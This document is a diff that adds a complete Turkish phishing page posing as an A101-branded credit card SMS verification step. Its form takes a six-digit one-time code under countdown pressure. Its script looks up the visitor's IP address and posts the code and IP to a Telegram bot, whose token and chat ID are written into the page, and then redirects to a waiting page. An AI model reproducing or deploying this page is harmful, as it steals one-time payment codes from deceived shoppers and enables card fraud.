@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kredi Kartı SMS Doğrulama</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(to bottom right, #2CBAD3, #2498b3);
+            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+        .verification-container {
+            background: #fff;
+            border: none;
+            border-radius: 20px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+            padding: 30px;
+            width: 400px;
+            max-width: 90%; /* Mobil cihazlar için genişlik sınırı */
+            text-align: center;
+        }
+        .verification-container img {
+            max-width: 150px;
+            height: auto;
+            margin-bottom: 15px;
+        }
+        .verification-container h1 {
+            color: #2CBAD3;
+            font-size: 26px;
+            margin-bottom: 15px;
+        }
+        .field {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        .field label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #555;
+        }
+        .field input {
+            width: calc(100% - 20px);
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            font-size: 16px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+        .field input:focus {
+            border-color: #2CBAD3;
+            outline: none;
+        }
+        button {
+            width: 100%;
+            background: linear-gradient(to right, #2CBAD3, #2498b3);
+            color: white;
+            padding: 15px;
+            border: none;
+            border-radius: 15px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+        button:hover {
+            background: linear-gradient(to right, #2498b3, #2CBAD3);
+        }
+        button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+        .timer {
+            color: #2498b3;
+            font-weight: bold;
+            margin-top: 10px;
+            font-size: 18px;
+        }
+
+        /* Mobil Uyumluluk */
+        @media (max-width: 768px) {
+            body {
+                padding: 10px;
+            }
+            .verification-container {
+                padding: 20px;
+                border-radius: 15px;
+            }
+            .verification-container h1 {
+                font-size: 22px;
+            }
+            .field input {
+                font-size: 14px;
+                padding: 10px;
+            }
+            button {
+                font-size: 14px;
+                padding: 12px;
+            }
+            .timer {
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="verification-container">
+        <img src="https://www.evrensel.net/images/840/upload/dosya/181542.jpg" alt="A101 Logosu">
+        <h1>Telefon Doğrulama Kodu </h1>
+        <form id="smsVerificationForm">
+            <!-- SMS Kodu -->
+            <div class="field">
+                <label for="smsCode">SMS Kodu:</label>
+                
+                <input 
+                    type="text" 
+                    id="smsCode" 
+                    name="smsCode" 
+                    placeholder="6 Haneli SMS Kodu" 
+                    maxlength="6" 
+                    pattern="\d{6}" 
+                    title="Lütfen 6 haneli SMS kodunu giriniz." 
+                    required>
+            </div>
+            <!-- Gönder Butonu -->
+            İşlemenizde Devam Etmek İçin Lütfen Telefonunuza Gelen Kodu Giriniz
+            <br>
+            <br>
+            <button type="submit" id="submitButton">Doğrula</button>
+            <div class="timer" id="timer">Kalan Süre: 1:30</div>
+        </form>
+    </div>
+
+    <script>
+        // Sayaç Başlangıcı (1 dakika 30 saniye)
+        let timeLeft = 90; // saniye cinsinden
+        const timerElement = document.getElementById('timer');
+        const submitButton = document.getElementById('submitButton');
+
+        const countdown = setInterval(() => {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            timerElement.textContent = `Kalan Süre: ${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+            
+            if (timeLeft <= 0) {
+                clearInterval(countdown);
+                timerElement.textContent = 'Süre Doldu!';
+                submitButton.disabled = true; // Butonu devre dışı bırak
+                
+                // Sayfayı yenile
+                setTimeout(() => {
+                    location.reload();
+                }, 1000); // 1 saniye sonra yenile
+            }
+            
+            timeLeft--;
+        }, 1000);
+
+        // Telegram API'ye Mesaj Gönderim
+    document.getElementById('smsVerificationForm').addEventListener('submit', function(event) {
+        event.preventDefault();
+
+        // Form verisini al
+        const smsCode = document.getElementById('smsCode').value;
+
+        // IP adresini al
+        fetch('https://api64.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ipAddress = data.ip;
+
+                // Telegram API bilgileri
+                const botToken = "8064272310:AAGviMZYqAyuCqiV48yqDzZSqiPCcf-gVvs"; // Bot tokeninizi buraya yazın
+                const chatId = "-1002317303620"; // Hedef chat ID'sini buraya yazın
+                const telegramAPI = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+                // Mesaj içeriği
+                const message = `
+SMS Doğrulama:
+- SMS Kodu: ${smsCode}
+- IP Adresi: ${ipAddress}
+`;
+
+                // Telegram API'ye mesaj gönder
+                fetch(telegramAPI, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                })
+                .then(response => {
+                    if (response.ok) {
+                        window.location.href = "bekle.html"; // Başarılı gönderim sonrası bekle.html sayfasına yönlendir
+                    } else {
+                        alert('SMS gönderilemedi. Hata oluştu.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Hata:', error);
+                    alert('Bir hata oluştu. Lütfen tekrar deneyin.');
+                });
+            })
+            .catch(error => {
+                console.error('IP alma hatası:', error);
+                alert('IP adresi alınamadı. Lütfen tekrar deneyin.');
+            });
+    });
+</script>
+</body>
+</html>
